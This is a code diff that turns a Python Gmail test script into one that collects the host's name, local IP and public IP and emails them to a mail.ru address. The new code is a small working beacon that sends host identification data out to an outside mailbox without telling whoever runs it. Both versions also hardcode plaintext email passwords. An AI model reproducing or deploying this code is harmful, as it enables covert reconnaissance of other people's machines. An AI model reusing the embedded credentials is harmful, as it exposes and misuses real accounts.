@@ -1,4 +1,4 @@
-import smtplib
+import smtplib as smtp
 import socket
 from getpass import getpass
 from requests import get
@@ -6,28 +6,17 @@ hostname = socket.gethostname()
 local_ip = socket.gethostbyname(hostname)
 public_ip = get('http://api.ipify.org').text
 
-gmail_sender = 'tester8977@gmail.com'
-gmail_passwd = '7gM-UUD-zUh-zFa'
+src_mail = 'pecik_228@mail.ru'
+password_SMTP = 'uuQsFq9RiJMxgRmiwLuD'
 
-TO = 'egor40361@gmail.com'
-SUBJECT = 'TEST MAIL'
-TEXT = 'Here is a message from python.'
+dest_mail = 'uunluck01@mail.ru'
 
-server = smtplib.SMTP('smtp.gmail.com', 587)
+mail_text = (f'Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')
+message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(src_mail, dest_mail, 'IP', mail_text)
 
-server.ehlo()
-server.starttls()
-server.login(gmail_sender,gmail_passwd)
+server = smtp.SMTP_SSL('smtp.mail.ru')
 
-BODY = '\r\n'.join(['To: %s' % TO,
-                    'From: %s' % gmail_sender,
-                    'Subject: %s' % SUBJECT,
-                    '', TEXT])
-
-try:
-    server.sendmail(gmail_sender, [TO], BODY)
-    print ('email sent')
-except:
-    print ('error sending mail')
-
+server.login(src_mail, password_SMTP)
+server.auth_plain()
+server.sendmail(src_mail, dest_mail, message)
 server.quit()
